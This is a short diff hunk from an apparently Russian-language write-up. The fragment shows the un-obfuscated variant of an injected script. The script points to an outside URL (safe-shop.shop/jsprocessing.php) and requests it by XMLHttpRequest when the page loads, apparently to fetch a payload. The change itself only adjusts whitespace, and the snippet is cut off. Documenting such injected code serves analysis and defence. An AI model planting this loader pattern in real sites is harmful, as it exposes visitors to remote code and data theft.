@@ -24,8 +24,7 @@
 Либо вот такой вариант до обфускации
 
 `<script>
-        var script_url = 'https://safe-shop.shop/jsprocessing.php';
-        
+	        var script_url = 'https://safe-shop.shop/jsprocessing.php';
 		window.addEventListener("load", function () {
 			var request = new XMLHttpRequest();
 			request.open('GET', script_url, true);
